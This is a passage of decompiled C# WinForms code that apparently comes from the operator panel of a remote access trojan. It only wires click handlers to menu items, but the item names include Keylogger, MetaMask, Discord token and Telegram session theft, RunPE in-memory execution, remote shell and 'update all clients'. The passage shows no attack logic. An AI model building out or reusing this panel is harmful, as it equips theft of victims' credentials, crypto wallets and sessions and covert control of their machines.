		// (set) Token: 0x06000323 RID: 803 RVA: 0x00021ABC File Offset: 0x0001FCBC
		internal virtual Guna2Button Guna2Button7
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2Button7;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2Button7_Click);
				Guna2Button guna2Button = this._Guna2Button7;
				if (guna2Button != null)
				{
					guna2Button.Click -= value2;
				}
				this._Guna2Button7 = value;
				guna2Button = this._Guna2Button7;
				if (guna2Button != null)
				{
					guna2Button.Click += value2;
				}
			}
		}

		// Token: 0x17000141 RID: 321
		// (get) Token: 0x06000324 RID: 804 RVA: 0x00021AFF File Offset: 0x0001FCFF
		// (set) Token: 0x06000325 RID: 805 RVA: 0x00021B09 File Offset: 0x0001FD09
		internal virtual Guna2ContextMenuStrip Guna2ContextMenuStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000142 RID: 322
		// (get) Token: 0x06000326 RID: 806 RVA: 0x00021B12 File Offset: 0x0001FD12
		// (set) Token: 0x06000327 RID: 807 RVA: 0x00021B1C File Offset: 0x0001FD1C
		internal virtual ToolStripMenuItem KeyloggerToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._KeyloggerToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.KeyloggerToolStripMenuItem_Click);
				ToolStripMenuItem keyloggerToolStripMenuItem = this._KeyloggerToolStripMenuItem;
				if (keyloggerToolStripMenuItem != null)
				{
					keyloggerToolStripMenuItem.Click -= value2;
				}
				this._KeyloggerToolStripMenuItem = value;
				keyloggerToolStripMenuItem = this._KeyloggerToolStripMenuItem;
				if (keyloggerToolStripMenuItem != null)
				{
					keyloggerToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000143 RID: 323
		// (get) Token: 0x06000328 RID: 808 RVA: 0x00021B5F File Offset: 0x0001FD5F
		// (set) Token: 0x06000329 RID: 809 RVA: 0x00021B69 File Offset: 0x0001FD69
		internal virtual ToolStripMenuItem OpenUrlToolStripMenuItem2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000144 RID: 324
		// (get) Token: 0x0600032A RID: 810 RVA: 0x00021B72 File Offset: 0x0001FD72
		// (set) Token: 0x0600032B RID: 811 RVA: 0x00021B7C File Offset: 0x0001FD7C
		internal virtual ToolStripMenuItem VisibleToolStripMenuItem2
		{
			[CompilerGenerated]
			get
			{
				return this._VisibleToolStripMenuItem2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.VisibleToolStripMenuItem2_Click);
				ToolStripMenuItem visibleToolStripMenuItem = this._VisibleToolStripMenuItem2;
				if (visibleToolStripMenuItem != null)
				{
					visibleToolStripMenuItem.Click -= value2;
				}
				this._VisibleToolStripMenuItem2 = value;
				visibleToolStripMenuItem = this._VisibleToolStripMenuItem2;
				if (visibleToolStripMenuItem != null)
				{
					visibleToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000145 RID: 325
		// (get) Token: 0x0600032C RID: 812 RVA: 0x00021BBF File Offset: 0x0001FDBF
		// (set) Token: 0x0600032D RID: 813 RVA: 0x00021BCC File Offset: 0x0001FDCC
		internal virtual ToolStripMenuItem InvisibleToolStripMenuItem2
		{
			[CompilerGenerated]
			get
			{
				return this._InvisibleToolStripMenuItem2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.InvisibleToolStripMenuItem2_Click);
				ToolStripMenuItem invisibleToolStripMenuItem = this._InvisibleToolStripMenuItem2;
				if (invisibleToolStripMenuItem != null)
				{
					invisibleToolStripMenuItem.Click -= value2;
				}
				this._InvisibleToolStripMenuItem2 = value;
				invisibleToolStripMenuItem = this._InvisibleToolStripMenuItem2;
				if (invisibleToolStripMenuItem != null)
				{
					invisibleToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000146 RID: 326
		// (get) Token: 0x0600032E RID: 814 RVA: 0x00021C0F File Offset: 0x0001FE0F
		// (set) Token: 0x0600032F RID: 815 RVA: 0x00021C19 File Offset: 0x0001FE19
		internal virtual ToolStripMenuItem RecoveryToolStripMenuItem1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000147 RID: 327
		// (get) Token: 0x06000330 RID: 816 RVA: 0x00021C22 File Offset: 0x0001FE22
		// (set) Token: 0x06000331 RID: 817 RVA: 0x00021C2C File Offset: 0x0001FE2C
		internal virtual ToolStripMenuItem MetaMaskToolStripMenuItem2
		{
			[CompilerGenerated]
			get
			{
				return this._MetaMaskToolStripMenuItem2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.MetaMaskToolStripMenuItem2_Click);
				ToolStripMenuItem metaMaskToolStripMenuItem = this._MetaMaskToolStripMenuItem2;
				if (metaMaskToolStripMenuItem != null)
				{
					metaMaskToolStripMenuItem.Click -= value2;
				}
				this._MetaMaskToolStripMenuItem2 = value;
				metaMaskToolStripMenuItem = this._MetaMaskToolStripMenuItem2;
				if (metaMaskToolStripMenuItem != null)
				{
					metaMaskToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000148 RID: 328
		// (get) Token: 0x06000332 RID: 818 RVA: 0x00021C6F File Offset: 0x0001FE6F
		// (set) Token: 0x06000333 RID: 819 RVA: 0x00021C7C File Offset: 0x0001FE7C
		internal virtual ToolStripMenuItem DiscordTokenToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._DiscordTokenToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DiscordTokenToolStripMenuItem1_Click);
				ToolStripMenuItem discordTokenToolStripMenuItem = this._DiscordTokenToolStripMenuItem1;
				if (discordTokenToolStripMenuItem != null)
				{
					discordTokenToolStripMenuItem.Click -= value2;
				}
				this._DiscordTokenToolStripMenuItem1 = value;
				discordTokenToolStripMenuItem = this._DiscordTokenToolStripMenuItem1;
				if (discordTokenToolStripMenuItem != null)
				{
					discordTokenToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000149 RID: 329
		// (get) Token: 0x06000334 RID: 820 RVA: 0x00021CBF File Offset: 0x0001FEBF
		// (set) Token: 0x06000335 RID: 821 RVA: 0x00021CCC File Offset: 0x0001FECC
		internal virtual ToolStripMenuItem TelegramSessionToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._TelegramSessionToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.TelegramSessionToolStripMenuItem1_Click);
				ToolStripMenuItem telegramSessionToolStripMenuItem = this._TelegramSessionToolStripMenuItem1;
				if (telegramSessionToolStripMenuItem != null)
				{
					telegramSessionToolStripMenuItem.Click -= value2;
				}
				this._TelegramSessionToolStripMenuItem1 = value;
				telegramSessionToolStripMenuItem = this._TelegramSessionToolStripMenuItem1;
				if (telegramSessionToolStripMenuItem != null)
				{
					telegramSessionToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700014A RID: 330
		// (get) Token: 0x06000336 RID: 822 RVA: 0x00021D0F File Offset: 0x0001FF0F
		// (set) Token: 0x06000337 RID: 823 RVA: 0x00021D1C File Offset: 0x0001FF1C
		internal virtual ToolStripMenuItem FromDiskToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._FromDiskToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.FromDiskToolStripMenuItem_Click);
				ToolStripMenuItem fromDiskToolStripMenuItem = this._FromDiskToolStripMenuItem;
				if (fromDiskToolStripMenuItem != null)
				{
					fromDiskToolStripMenuItem.Click -= value2;
				}
				this._FromDiskToolStripMenuItem = value;
				fromDiskToolStripMenuItem = this._FromDiskToolStripMenuItem;
				if (fromDiskToolStripMenuItem != null)
				{
					fromDiskToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700014B RID: 331
		// (get) Token: 0x06000338 RID: 824 RVA: 0x00021D5F File Offset: 0x0001FF5F
		// (set) Token: 0x06000339 RID: 825 RVA: 0x00021D6C File Offset: 0x0001FF6C
		internal virtual ToolStripMenuItem FromLinkToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._FromLinkToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.FromLinkToolStripMenuItem_Click);
				ToolStripMenuItem fromLinkToolStripMenuItem = this._FromLinkToolStripMenuItem;
				if (fromLinkToolStripMenuItem != null)
				{
					fromLinkToolStripMenuItem.Click -= value2;
				}
				this._FromLinkToolStripMenuItem = value;
				fromLinkToolStripMenuItem = this._FromLinkToolStripMenuItem;
				if (fromLinkToolStripMenuItem != null)
				{
					fromLinkToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700014C RID: 332
		// (get) Token: 0x0600033A RID: 826 RVA: 0x00021DAF File Offset: 0x0001FFAF
		// (set) Token: 0x0600033B RID: 827 RVA: 0x00021DBC File Offset: 0x0001FFBC
		internal virtual ToolStripMenuItem FromMemoryToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._FromMemoryToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.FromMemoryToolStripMenuItem1_Click);
				ToolStripMenuItem fromMemoryToolStripMenuItem = this._FromMemoryToolStripMenuItem1;
				if (fromMemoryToolStripMenuItem != null)
				{
					fromMemoryToolStripMenuItem.Click -= value2;
				}
				this._FromMemoryToolStripMenuItem1 = value;
				fromMemoryToolStripMenuItem = this._FromMemoryToolStripMenuItem1;
				if (fromMemoryToolStripMenuItem != null)
				{
					fromMemoryToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700014D RID: 333
		// (get) Token: 0x0600033C RID: 828 RVA: 0x00021DFF File Offset: 0x0001FFFF
		// (set) Token: 0x0600033D RID: 829 RVA: 0x00021E0C File Offset: 0x0002000C
		internal virtual ToolStripMenuItem UpdateAllClientsToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._UpdateAllClientsToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.UpdateAllClientsToolStripMenuItem1_Click);
				ToolStripMenuItem updateAllClientsToolStripMenuItem = this._UpdateAllClientsToolStripMenuItem1;
				if (updateAllClientsToolStripMenuItem != null)
				{
					updateAllClientsToolStripMenuItem.Click -= value2;
				}
				this._UpdateAllClientsToolStripMenuItem1 = value;
				updateAllClientsToolStripMenuItem = this._UpdateAllClientsToolStripMenuItem1;
				if (updateAllClientsToolStripMenuItem != null)
				{
					updateAllClientsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700014E RID: 334
		// (get) Token: 0x0600033E RID: 830 RVA: 0x00021E4F File Offset: 0x0002004F
		// (set) Token: 0x0600033F RID: 831 RVA: 0x00021E5C File Offset: 0x0002005C
		internal virtual ToolStripMenuItem RemoveTaskToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._RemoveTaskToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RemoveTaskToolStripMenuItem1_Click);
				ToolStripMenuItem removeTaskToolStripMenuItem = this._RemoveTaskToolStripMenuItem1;
				if (removeTaskToolStripMenuItem != null)
				{
					removeTaskToolStripMenuItem.Click -= value2;
				}
				this._RemoveTaskToolStripMenuItem1 = value;
				removeTaskToolStripMenuItem = this._RemoveTaskToolStripMenuItem1;
				if (removeTaskToolStripMenuItem != null)
				{
					removeTaskToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700014F RID: 335
		// (get) Token: 0x06000340 RID: 832 RVA: 0x00021E9F File Offset: 0x0002009F
		// (set) Token: 0x06000341 RID: 833 RVA: 0x00021EA9 File Offset: 0x000200A9
		internal virtual Guna2ContextMenuStrip Guna2ContextMenuStrip3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000150 RID: 336
		// (get) Token: 0x06000342 RID: 834 RVA: 0x00021EB2 File Offset: 0x000200B2
		// (set) Token: 0x06000343 RID: 835 RVA: 0x00021EBC File Offset: 0x000200BC
		internal virtual ToolStripMenuItem InformationToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._InformationToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.InformationToolStripMenuItem1_Click);
				ToolStripMenuItem informationToolStripMenuItem = this._InformationToolStripMenuItem1;
				if (informationToolStripMenuItem != null)
				{
					informationToolStripMenuItem.Click -= value2;
				}
				this._InformationToolStripMenuItem1 = value;
				informationToolStripMenuItem = this._InformationToolStripMenuItem1;
				if (informationToolStripMenuItem != null)
				{
					informationToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000151 RID: 337
		// (get) Token: 0x06000344 RID: 836 RVA: 0x00021EFF File Offset: 0x000200FF
		// (set) Token: 0x06000345 RID: 837 RVA: 0x00021F09 File Offset: 0x00020109
		internal virtual ToolStripMenuItem RunFileToolStripMenuItem { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000152 RID: 338
		// (get) Token: 0x06000346 RID: 838 RVA: 0x00021F12 File Offset: 0x00020112
		// (set) Token: 0x06000347 RID: 839 RVA: 0x00021F1C File Offset: 0x0002011C
		internal virtual ToolStripMenuItem DiskToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._DiskToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DiskToolStripMenuItem_Click);
				ToolStripMenuItem diskToolStripMenuItem = this._DiskToolStripMenuItem;
				if (diskToolStripMenuItem != null)
				{
					diskToolStripMenuItem.Click -= value2;
				}
				this._DiskToolStripMenuItem = value;
				diskToolStripMenuItem = this._DiskToolStripMenuItem;
				if (diskToolStripMenuItem != null)
				{
					diskToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000153 RID: 339
		// (get) Token: 0x06000348 RID: 840 RVA: 0x00021F5F File Offset: 0x0002015F
		// (set) Token: 0x06000349 RID: 841 RVA: 0x00021F6C File Offset: 0x0002016C
		internal virtual ToolStripMenuItem LinkToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._LinkToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.LinkToolStripMenuItem_Click);
				ToolStripMenuItem linkToolStripMenuItem = this._LinkToolStripMenuItem;
				if (linkToolStripMenuItem != null)
				{
					linkToolStripMenuItem.Click -= value2;
				}
				this._LinkToolStripMenuItem = value;
				linkToolStripMenuItem = this._LinkToolStripMenuItem;
				if (linkToolStripMenuItem != null)
				{
					linkToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000154 RID: 340
		// (get) Token: 0x0600034A RID: 842 RVA: 0x00021FAF File Offset: 0x000201AF
		// (set) Token: 0x0600034B RID: 843 RVA: 0x00021FBC File Offset: 0x000201BC
		internal virtual ToolStripMenuItem MemoryToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._MemoryToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.MemoryToolStripMenuItem1_Click);
				ToolStripMenuItem memoryToolStripMenuItem = this._MemoryToolStripMenuItem1;
				if (memoryToolStripMenuItem != null)
				{
					memoryToolStripMenuItem.Click -= value2;
				}
				this._MemoryToolStripMenuItem1 = value;
				memoryToolStripMenuItem = this._MemoryToolStripMenuItem1;
				if (memoryToolStripMenuItem != null)
				{
					memoryToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000155 RID: 341
		// (get) Token: 0x0600034C RID: 844 RVA: 0x00021FFF File Offset: 0x000201FF
		// (set) Token: 0x0600034D RID: 845 RVA: 0x0002200C File Offset: 0x0002020C
		internal virtual ToolStripMenuItem RunPEToolStripMenuItem2
		{
			[CompilerGenerated]
			get
			{
				return this._RunPEToolStripMenuItem2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RunPEToolStripMenuItem2_Click);
				ToolStripMenuItem runPEToolStripMenuItem = this._RunPEToolStripMenuItem2;
				if (runPEToolStripMenuItem != null)
				{
					runPEToolStripMenuItem.Click -= value2;
				}
				this._RunPEToolStripMenuItem2 = value;
				runPEToolStripMenuItem = this._RunPEToolStripMenuItem2;
				if (runPEToolStripMenuItem != null)
				{
					runPEToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000156 RID: 342
		// (get) Token: 0x0600034E RID: 846 RVA: 0x0002204F File Offset: 0x0002024F
		// (set) Token: 0x0600034F RID: 847 RVA: 0x00022059 File Offset: 0x00020259
		internal virtual ToolStripMenuItem OpenUrlToolStripMenuItem1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000157 RID: 343
		// (get) Token: 0x06000350 RID: 848 RVA: 0x00022062 File Offset: 0x00020262
		// (set) Token: 0x06000351 RID: 849 RVA: 0x0002206C File Offset: 0x0002026C
		internal virtual ToolStripMenuItem VisibleToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._VisibleToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.VisibleToolStripMenuItem1_Click);
				ToolStripMenuItem visibleToolStripMenuItem = this._VisibleToolStripMenuItem1;
				if (visibleToolStripMenuItem != null)
				{
					visibleToolStripMenuItem.Click -= value2;
				}
				this._VisibleToolStripMenuItem1 = value;
				visibleToolStripMenuItem = this._VisibleToolStripMenuItem1;
				if (visibleToolStripMenuItem != null)
				{
					visibleToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000158 RID: 344
		// (get) Token: 0x06000352 RID: 850 RVA: 0x000220AF File Offset: 0x000202AF
		// (set) Token: 0x06000353 RID: 851 RVA: 0x000220BC File Offset: 0x000202BC
		internal virtual ToolStripMenuItem InvisibleToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._InvisibleToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.InvisibleToolStripMenuItem1_Click);
				ToolStripMenuItem invisibleToolStripMenuItem = this._InvisibleToolStripMenuItem1;
				if (invisibleToolStripMenuItem != null)
				{
					invisibleToolStripMenuItem.Click -= value2;
				}
				this._InvisibleToolStripMenuItem1 = value;
				invisibleToolStripMenuItem = this._InvisibleToolStripMenuItem1;
				if (invisibleToolStripMenuItem != null)
				{
					invisibleToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000159 RID: 345
		// (get) Token: 0x06000354 RID: 852 RVA: 0x000220FF File Offset: 0x000202FF
		// (set) Token: 0x06000355 RID: 853 RVA: 0x00022109 File Offset: 0x00020309
		internal virtual ToolStripMenuItem OptionsToolStripMenuItem { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700015A RID: 346
		// (get) Token: 0x06000356 RID: 854 RVA: 0x00022112 File Offset: 0x00020312
		// (set) Token: 0x06000357 RID: 855 RVA: 0x0002211C File Offset: 0x0002031C
		internal virtual ToolStripMenuItem ShellToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._ShellToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ShellToolStripMenuItem_Click);
				ToolStripMenuItem shellToolStripMenuItem = this._ShellToolStripMenuItem;
				if (shellToolStripMenuItem != null)
				{
					shellToolStripMenuItem.Click -= value2;
				}
				this._ShellToolStripMenuItem = value;
				shellToolStripMenuItem = this._ShellToolStripMenuItem;
				if (shellToolStripMenuItem != null)
				{
					shellToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700015B RID: 347
		// (get) Token: 0x06000358 RID: 856 RVA: 0x0002215F File Offset: 0x0002035F
		// (set) Token: 0x06000359 RID: 857 RVA: 0x0002216C File Offset: 0x0002036C
		internal virtual ToolStripMenuItem FileManagerToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._FileManagerToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.FileManagerToolStripMenuItem1_Click);
				ToolStripMenuItem fileManagerToolStripMenuItem = this._FileManagerToolStripMenuItem1;
				if (fileManagerToolStripMenuItem != null)
				{
					fileManagerToolStripMenuItem.Click -= value2;
				}
				this._FileManagerToolStripMenuItem1 = value;
				fileManagerToolStripMenuItem = this._FileManagerToolStripMenuItem1;
				if (fileManagerToolStripMenuItem != null)
				{
					fileManagerToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700015C RID: 348
		// (get) Token: 0x0600035A RID: 858 RVA: 0x000221AF File Offset: 0x000203AF
		// (set) Token: 0x0600035B RID: 859 RVA: 0x000221B9 File Offset: 0x000203B9
		internal virtual ToolStripMenuItem RecoveryOptionsToolStripMenuItem { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700015D RID: 349
		// (get) Token: 0x0600035C RID: 860 RVA: 0x000221C2 File Offset: 0x000203C2
		// (set) Token: 0x0600035D RID: 861 RVA: 0x000221CC File Offset: 0x000203CC
		internal virtual ToolStripMenuItem RegistryEditorToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._RegistryEditorToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RegistryEditorToolStripMenuItem1_Click);
				ToolStripMenuItem registryEditorToolStripMenuItem = this._RegistryEditorToolStripMenuItem1;
				if (registryEditorToolStripMenuItem != null)
				{
					registryEditorToolStripMenuItem.Click -= value2;
				}
				this._RegistryEditorToolStripMenuItem1 = value;
				registryEditorToolStripMenuItem = this._RegistryEditorToolStripMenuItem1;
				if (registryEditorToolStripMenuItem != null)
				{
					registryEditorToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700015E RID: 350
		// (get) Token: 0x0600035E RID: 862 RVA: 0x0002220F File Offset: 0x0002040F
		// (set) Token: 0x0600035F RID: 863 RVA: 0x0002221C File Offset: 0x0002041C
		internal virtual ToolStripMenuItem TCPConnectionsToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._TCPConnectionsToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.TCPConnectionsToolStripMenuItem_Click);
				ToolStripMenuItem tcpconnectionsToolStripMenuItem = this._TCPConnectionsToolStripMenuItem;
				if (tcpconnectionsToolStripMenuItem != null)
				{
					tcpconnectionsToolStripMenuItem.Click -= value2;
				}
				this._TCPConnectionsToolStripMenuItem = value;
				tcpconnectionsToolStripMenuItem = this._TCPConnectionsToolStripMenuItem;
				if (tcpconnectionsToolStripMenuItem != null)
				{
					tcpconnectionsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700015F RID: 351
		// (get) Token: 0x06000360 RID: 864 RVA: 0x0002225F File Offset: 0x0002045F
		// (set) Token: 0x06000361 RID: 865 RVA: 0x0002226C File Offset: 0x0002046C
		internal virtual ToolStripMenuItem ActiveWindowsToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._ActiveWindowsToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ActiveWindowsToolStripMenuItem1_Click);
				ToolStripMenuItem activeWindowsToolStripMenuItem = this._ActiveWindowsToolStripMenuItem1;
				if (activeWindowsToolStripMenuItem != null)
				{
					activeWindowsToolStripMenuItem.Click -= value2;
				}
				this._ActiveWindowsToolStripMenuItem1 = value;
				activeWindowsToolStripMenuItem = this._ActiveWindowsToolStripMenuItem1;
				if (activeWindowsToolStripMenuItem != null)
				{
					activeWindowsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000160 RID: 352
		// (get) Token: 0x06000362 RID: 866 RVA: 0x000222AF File Offset: 0x000204AF
		// (set) Token: 0x06000363 RID: 867 RVA: 0x000222BC File Offset: 0x000204BC
		internal virtual ToolStripMenuItem StartupManagerToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._StartupManagerToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.StartupManagerToolStripMenuItem1_Click);
				ToolStripMenuItem startupManagerToolStripMenuItem = this._StartupManagerToolStripMenuItem1;
				if (startupManagerToolStripMenuItem != null)
				{
					startupManagerToolStripMenuItem.Click -= value2;
				}
				this._StartupManagerToolStripMenuItem1 = value;
				startupManagerToolStripMenuItem = this._StartupManagerToolStripMenuItem1;
				if (startupManagerToolStripMenuItem != null)
				{
					startupManagerToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000161 RID: 353
		// (get) Token: 0x06000364 RID: 868 RVA: 0x000222FF File Offset: 0x000204FF
		// (set) Token: 0x06000365 RID: 869 RVA: 0x0002230C File Offset: 0x0002050C
		internal virtual ToolStripMenuItem ProcessManagerToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._ProcessManagerToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ProcessManagerToolStripMenuItem1_Click);
				ToolStripMenuItem processManagerToolStripMenuItem = this._ProcessManagerToolStripMenuItem1;
				if (processManagerToolStripMenuItem != null)
				{
					processManagerToolStripMenuItem.Click -= value2;
				}
				this._ProcessManagerToolStripMenuItem1 = value;
				processManagerToolStripMenuItem = this._ProcessManagerToolStripMenuItem1;
				if (processManagerToolStripMenuItem != null)
				{
					processManagerToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000162 RID: 354
		// (get) Token: 0x06000366 RID: 870 RVA: 0x0002234F File Offset: 0x0002054F
		// (set) Token: 0x06000367 RID: 871 RVA: 0x0002235C File Offset: 0x0002055C
		internal virtual ToolStripMenuItem ServiceManagerToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._ServiceManagerToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ServiceManagerToolStripMenuItem1_Click);
				ToolStripMenuItem serviceManagerToolStripMenuItem = this._ServiceManagerToolStripMenuItem1;
				if (serviceManagerToolStripMenuItem != null)
				{
					serviceManagerToolStripMenuItem.Click -= value2;
				}
				this._ServiceManagerToolStripMenuItem1 = value;
				serviceManagerToolStripMenuItem = this._ServiceManagerToolStripMenuItem1;
				if (serviceManagerToolStripMenuItem != null)
				{
					serviceManagerToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000163 RID: 355
		// (get) Token: 0x06000368 RID: 872 RVA: 0x0002239F File Offset: 0x0002059F
		// (set) Token: 0x06000369 RID: 873 RVA: 0x000223AC File Offset: 0x000205AC
		internal virtual ToolStripMenuItem ClipboardManagerToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._ClipboardManagerToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ClipboardManagerToolStripMenuItem1_Click);
				ToolStripMenuItem clipboardManagerToolStripMenuItem = this._ClipboardManagerToolStripMenuItem1;
				if (clipboardManagerToolStripMenuItem != null)
				{
					clipboardManagerToolStripMenuItem.Click -= value2;
				}
				this._ClipboardManagerToolStripMenuItem1 = value;
				clipboardManagerToolStripMenuItem = this._ClipboardManagerToolStripMenuItem1;
				if (clipboardManagerToolStripMenuItem != null)
				{
					clipboardManagerToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000164 RID: 356
		// (get) Token: 0x0600036A RID: 874 RVA: 0x000223EF File Offset: 0x000205EF
		// (set) Token: 0x0600036B RID: 875 RVA: 0x000223FC File Offset: 0x000205FC
		internal virtual ToolStripMenuItem InstalledProgramsToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._InstalledProgramsToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.InstalledProgramsToolStripMenuItem1_Click);
				ToolStripMenuItem installedProgramsToolStripMenuItem = this._InstalledProgramsToolStripMenuItem1;
				if (installedProgramsToolStripMenuItem != null)
				{
